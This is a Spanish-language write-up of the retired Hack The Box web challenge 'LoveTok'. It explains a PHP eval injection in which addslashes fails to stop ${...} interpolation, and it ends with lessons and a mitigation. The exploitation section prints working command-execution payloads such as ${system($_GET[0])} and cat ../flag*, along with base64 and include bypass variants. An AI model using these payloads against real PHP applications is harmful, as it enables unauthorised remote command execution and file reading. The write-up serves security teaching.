---
challenge: LoveTok
type: Web
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [web, php, code-injection, eval]
---

# LoveTok — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Reto resuelto; sin flags reales.

## TL;DR

El controlador recibe `format` por `GET` y lo concatena dentro de un `eval` que llama a `date()`. `addslashes` escapa comillas y barras, pero **no** escapa la interpolación `${...}` de PHP: con `${system($_GET[0])}` se ejecuta un comando y se lee la flag.

## Enunciado y superficie

```text
/?format=r
```

Devuelve la fecha con formato `r`. El código viene en el reto: `controllers/TimeController.php` y `models/TimeModel.php`.

## Reconocimiento

```bash
curl -s 'http://<IP>:<PORT>/'
curl -s 'http://<IP>:<PORT>/?format=Y-m-d'
```

Cambiar `format` cambia la salida: la entrada llega a la función de fecha.

## Explicación del fallo

```php
public function getTime() {
    eval('$time = date("' . $this->format . '", strtotime("' . $this->prediction . '"));');
    return isset($time) ? $time : 'Something went terribly wrong';
}
```

`format` pasa por `addslashes()` (escapa `'`, `"`, `\` y NUL). El payload **no necesita comillas**: PHP interpola `${expresión}` dentro de cadenas dobles y evalúa la expresión, así que la comilla que cierra el `date("` se aporta como `${...}`.

## Explotación

```text
/?format=${system($_GET[0])}&0=ls
```

`system()` imprime la salida directamente; el valor de `date()` ya da igual. La flag no está en el directorio actual:

```text
/?format=${system($_GET[0])}&0=cat+../flag*
```

```text
HTB{<flag>}
```

Alternativas si el espacio o las comillas se filtran:

```text
${system(base64_decode($_GET[0]))}      # y enviar el comando en base64
${include($_GET[0])}                    # para leer un fichero PHP/texto
```

## Evidencia

- Salidas recortadas; sin flags.
- Los valores reales viven en `private/`.

## Lecciones aprendidas

- **`addslashes` no es una defensa**: `$`, `{` y `}` siguen pasando.
- **`${}` en cadenas dobles** es interpolación con evaluación, no concatenación.
- **La comilla sobra**: cerrar la cadena con `${` evita el filtro y mantiene el código válido.
- **`../`**: la flag se sirve un nivel arriba del `DocumentRoot`.

- `eval` con entrada del usuario es RCE, aunque el autor crea que sólo controla un formato.
- Un parámetro que «sólo» elige un formato de fecha merece una allowlist, no un filtro de comillas.
- Mitigación: `date()` con formatos permitidos (`Y-m-d H:i:s`) y sin `eval`.
